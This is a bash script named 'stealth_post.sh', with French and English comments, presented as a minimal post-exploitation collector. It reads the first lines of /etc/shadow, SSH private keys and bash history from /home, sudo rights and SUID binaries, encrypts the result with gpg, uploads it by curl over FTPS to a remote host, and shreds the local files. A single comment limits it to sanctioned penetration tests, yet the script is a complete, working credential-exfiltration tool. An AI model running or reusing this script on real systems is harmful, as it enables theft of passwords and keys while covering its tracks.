#!/bin/bash
set -euo pipefail

# Usage :
#   export FTP_USER="utilisateur"
#   export FTP_PASS="motdepasse"
#   export FTP_HOST="exemple.com"
#   export FTP_PATH="uploads/sysinfo.txt.gpg"
#   export GPG_PASSPHRASE="phrase_secrete"
#   bash stealth_post.sh

# Read FTP credentials from environment or optional config file
FTP_USER="${FTP_USER:-}"
FTP_PASS="${FTP_PASS:-}"
FTP_HOST="${FTP_HOST:-}"
FTP_PATH="${FTP_PATH:-}"
GPG_PASSPHRASE="${GPG_PASSPHRASE:-}"
# Optional configuration file (~/.stealth_post.conf)
CONFIG_FILE="${FTP_CONFIG_FILE:-$HOME/.stealth_post.conf}"

# Source config file if variables are empty and file exists
if [[ -z "$FTP_USER" || -z "$FTP_PASS" || -z "$FTP_HOST" || -z "$FTP_PATH" || -z "$GPG_PASSPHRASE" ]]; then
    if [[ -f "$CONFIG_FILE" ]]; then
        # shellcheck disable=SC1090
        source "$CONFIG_FILE"
        FTP_USER="${FTP_USER:-}"
        FTP_PASS="${FTP_PASS:-}"
        FTP_HOST="${FTP_HOST:-}"
        FTP_PATH="${FTP_PATH:-}"
        GPG_PASSPHRASE="${GPG_PASSPHRASE:-}"
    fi
fi

# Error if credentials still unset
if [[ -z "$FTP_USER" || -z "$FTP_PASS" || -z "$FTP_HOST" || -z "$FTP_PATH" || -z "$GPG_PASSPHRASE" ]]; then
    echo "❌ Variables FTP_USER, FTP_PASS, FTP_HOST, FTP_PATH ou GPG_PASSPHRASE non définies" >&2
    exit 1
fi

# Minimal post‑exploitation collection script. It gathers basic system
# information and sends it to a remote FTP server for analysis. This
# exfiltration mechanism must only be used in authorized contexts such as
# sanctioned penetration tests. Using it without permission is prohibited.

OUT="$(mktemp)"
trap 'rm -f "$OUT"' EXIT
> "$OUT"

# Collecte minimale
echo "[*] $(date '+%Y-%m-%d %H:%M:%S')" >> "$OUT"
id >> "$OUT"
hostname >> "$OUT"
ip a | grep inet | grep -v '127.0.0.1' | awk '{print $2}' | head -n1 >> "$OUT"

# Si root, capture quelques lignes du fichier shadow
[ "$(id -u)" -eq 0 ] && head -n 5 /etc/shadow >> "$OUT" 2>/dev/null

# Clés SSH & historique bash (extraits légers)
find /home -name id_rsa -exec head -n 5 {} \; 2>/dev/null >> "$OUT"
find /home -name .bash_history -exec head -n 5 {} \; 2>/dev/null >> "$OUT"

# Commandes sudo autorisées
sudo -l 2>/dev/null | grep -v "may not" >> "$OUT"

# Binaries SUID
find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null | grep -E 'bash|python|perl|find|nmap' >> "$OUT"

# Chiffrement du fichier temporaire
if ! command -v gpg >/dev/null 2>&1; then
    echo "❌ gpg n'est pas installé" >&2
    exit 1
fi

ENC_OUT="$OUT.gpg"
if ! gpg --batch --yes --passphrase "$GPG_PASSPHRASE" -c "$OUT"; then
    echo "❌ Échec du chiffrement avec gpg" >&2
    exit 1
fi

# Exfiltration via FTPS
if ! command -v curl >/dev/null 2>&1; then
    echo "❌ curl n'est pas installé" >&2
    exit 1
fi

if ! curl --ftp-ssl --ssl-reqd -s -T "$ENC_OUT" --user "$FTP_USER:$FTP_PASS" "ftp://$FTP_HOST/$FTP_PATH" --ftp-create-dirs >/dev/null; then
    echo "❌ Échec de l'exfiltration via curl (FTPS)" >&2
    exit 1
fi

# Nettoyage
shred -u "$OUT" "$ENC_OUT"
